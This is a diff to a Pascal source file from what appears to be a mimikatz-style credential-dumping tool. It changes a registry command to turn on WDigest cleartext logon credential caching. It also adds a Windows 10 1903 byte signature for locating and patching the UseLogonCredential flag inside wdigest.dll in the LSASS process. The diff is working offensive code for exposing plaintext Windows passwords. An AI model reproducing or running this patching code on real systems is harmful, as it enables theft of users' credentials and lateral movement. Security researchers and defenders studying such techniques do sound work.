@@ -857,21 +857,23 @@ see
 https://gist.github.com/xpn/163360379f3cce2443a7b074f0a173b8
 https://blog.xpnsec.com/exploring-mimikatz-part-1/
 the below requires a reboot...
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
 to query...
-reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential}
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+}
 function wdigest_on(pid:dword):boolean;
 const
 
   //dd wdigest!g_fParameter_UseLogonCredential in windbg
   //or
-  //search g_fParameter_UseLogonCredential in IDA
+  //search g_fParameter_UseLogonCredential in IDA  (spacceptcredentials)
   //look for cmp     cs:g_fParameter_UseLogonCredential, ebx
   //which translates to 39 1D F5  14 03 00
   //F5  14 03 00 is your offset (from current pos) to g_fParameter_UseLogonCredential
   //or we could maintain a table of offsets per windows versions...
   PTRN_WIN81_UseLogonCredential:array [0..14] of byte=       ($F7,$46,$50,$00,$08,$00,$00,$0F,$85,$0C,$52,$00,$00,$39,$1D);
   PTRN_WIN10_1703_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$11,$3B,$00,$00,$39,$1D);
+  PTRN_WIN10_1903_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$E2,$71,$00,$00,$39,$1D);
 var
   module:string='wdigest.dll';
   hprocess:thandle;
@@ -898,6 +900,12 @@ result:=false;
         begin
         setlength(pattern,sizeof(PTRN_WIN10_1703_UseLogonCredential));
         copymemory(@pattern[0],@PTRN_WIN10_1703_UseLogonCredential[0],sizeof(PTRN_WIN10_1703_UseLogonCredential));
+        patch_pos:=4;
+        end;
+     if pos('-1903',winver)>0 then
+        begin
+        setlength(pattern,sizeof(PTRN_WIN10_1903_UseLogonCredential));
+        copymemory(@pattern[0],@PTRN_WIN10_1903_UseLogonCredential[0],sizeof(PTRN_WIN10_1903_UseLogonCredential));
         patch_pos:=4;
         end;
      end; //if (lowercase(osarch)='amd64') then
